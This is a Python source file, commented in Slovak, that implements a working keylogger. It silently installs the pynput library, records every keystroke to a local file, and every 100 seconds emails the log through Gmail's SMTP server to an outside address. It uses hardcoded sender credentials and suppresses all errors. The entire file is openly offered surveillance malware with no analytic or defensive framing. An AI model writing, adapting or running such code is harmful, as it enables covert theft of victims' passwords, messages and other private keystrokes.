import subprocess
import sys
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Funkcia na inštaláciu potrebného balíka
# Skontroluje, či je požadovaný balík nainštalovaný, a ak nie, nainštaluje ho pomocou pip
def install_package(package):
    try:
        # Spustí príkaz na inštaláciu balíka pomocou pip
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        # Ak sa vyskytne chyba, ukončí program
        sys.exit(1)

# Pokus o importovanie knižnice pynput
try:
    from pynput import keyboard
except ImportError:
    # Ak knižnica nie je nainštalovaná, nainštaluje ju
    install_package("pynput")
    from pynput import keyboard

# Názov súboru, do ktorého sa budú ukladať zaznamenané klávesy
log_file = "key_log.txt"

# E-mailové prihlasovacie údaje
EMAIL_ADDRESS = "clementinaf2@gratyer.com"  # E-mailová adresa odosielateľa
EMAIL_PASSWORD = "banan1122"               # Heslo k e-mailovej adrese
EMAIL_TO = "random@exma.com"               # E-mailová adresa príjemcu

# Funkcia na odoslanie e-mailu s obsahom logovacieho súboru
def send_email():
    try:
        # Otvorí logovací súbor a prečíta jeho obsah
        with open(log_file, "r") as file:
            log_content = file.read()

        # Vytvorí e-mailovú správu
        msg = MIMEMultipart()  # Multipart umožňuje pridávať rôzne časti (napr. text, prílohy)
        msg['From'] = EMAIL_ADDRESS # E-mail odkial
        msg['To'] = EMAIL_TO # E-mail kde
        msg['Subject'] = "Keylogger Log File"  # Predmet e-mailu
        msg.attach(MIMEText(log_content, "plain"))  # Pridá obsah logovacieho súboru ako obyčajný text

        # Pripojenie k SMTP serveru (napr. Gmail)
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()  # Aktivuje šifrované spojenie (TLS)
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)  # Prihlási sa pomocou prihlasovacích údajov
            server.sendmail(EMAIL_ADDRESS, EMAIL_TO, msg.as_string())  # Odošle e-mail
    except Exception:
        pass  # Ak nastane chyba, ignoruje ju

# Funkcia na odosielanie e-mailov v pravidelných intervaloch
def periodic_email(interval):
    while True:
        time.sleep(interval)  # Počká zadaný interval (v sekundách)
        send_email()  # Zavolá funkciu na odoslanie e-mailu

# Funkcia na zaznamenávanie stlačených klávesov
def on_press(key):
    try:
        # Zaznamená stlačený kláves do logovacieho súboru
        with open(log_file, "a") as file:
            file.write(f"{key.char}")  # Uloží písmeno alebo znak
    except AttributeError:
        # Ak ide o špeciálny kláves (napr. Enter, Backspace), zaznamená jeho názov
        with open(log_file, "a") as file:
            file.write(f" [{key.name}] ")  # Použije názov špeciálneho klávesu

# Hlavná časť programu
if __name__ == "__main__":
    # Vytvorí vlákno na pravidelné odosielanie e-mailov
    email_thread = threading.Thread(target=periodic_email, args=(100,))  # Interval 100 sekúnd
    email_thread.daemon = True  # Umožní ukončiť vlákno, keď program skončí
    email_thread.start()  # Spustí vlákno

    # Spustí sledovanie klávesov
    with keyboard.Listener(on_press=on_press) as listener:  # Funkcia on_release bola odstránená
        listener.join()  # Počká na ukončenie sledovania
